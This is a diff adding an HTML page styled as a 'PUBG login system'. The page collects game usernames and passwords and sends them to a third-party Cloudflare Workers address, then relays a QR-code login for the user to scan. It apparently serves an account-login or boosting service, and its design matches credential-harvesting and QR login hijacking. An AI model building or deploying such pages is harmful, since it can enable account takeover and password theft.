@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PUBG登录系统</title>
+    <style>
+        body {
+            background: #0a0e27;
+            color: white;
+            font-family: system-ui;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: #141a33;
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+        }
+        input {
+            background: #1f2a4a;
+            color: white;
+        }
+        button {
+            background: #3b82f6;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .qr-area {
+            background: #1f2a4a;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+            min-height: 200px;
+        }
+        .qr-area img {
+            max-width: 100%;
+        }
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>PUBG登录系统</h2>
+    <input type="text" id="username" placeholder="游戏账号">
+    <input type="password" id="password" placeholder="密码">
+    <button onclick="startLogin()">提交订单</button>
+    <div class="qr-area" id="qrArea">
+        <div>等待扫码...</div>
+    </div>
+    <div class="status" id="status">请输入账号密码</div>
+</div>
+
+<script>
+    // 这个地址后面会替换成你的Cloudflare Workers地址
+    const WORKER_URL = "https://你的workers地址.workers.dev";
+    
+    let currentUser = null;
+    
+    async function startLogin() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if (!username || !password) {
+            alert('请输入账号和密码');
+            return;
+        }
+        
+        currentUser = username;
+        document.getElementById('status').innerHTML = '正在请求登录...';
+        document.getElementById('qrArea').innerHTML = '<div>连接中...</div>';
+        
+        try {
+            // 向Workers发送登录请求
+            const response = await fetch(WORKER_URL + '/request', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    user: username,
+                    pass: password
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.qr) {
+                // 显示二维码
+                document.getElementById('qrArea').innerHTML = '<img src="' + data.qr + '">';
+                document.getElementById('status').innerHTML = '请用游戏扫码登录';
+                
+                // 轮询检查登录是否完成
+                checkStatus(username);
+            } else {
+                document.getElementById('status').innerHTML = '❌ ' + (data.error || '请求失败');
+            }
+        } catch(e) {
+            document.getElementById('status').innerHTML = '❌ 连接失败';
+        }
+    }
+    
+    async function checkStatus(user) {
+        for(let i = 0; i < 60; i++) { // 最多等2分钟
+            await new Promise(r => setTimeout(r, 2000));
+            
+            const resp = await fetch(WORKER_URL + '/status?user=' + user);
+            const data = await resp.json();
+            
+            if (data.status === 'success') {
+                document.getElementById('status').innerHTML = '✅ 登录成功！';
+                document.getElementById('qrArea').innerHTML = '<div>✅ 上号完成</div>';
+                break;
+            } else if (data.status === 'failed') {
+                document.getElementById('status').innerHTML = '❌ 登录失败';
+                break;
+            }
+        }
+    }
+</script>
+</body>
+</html>
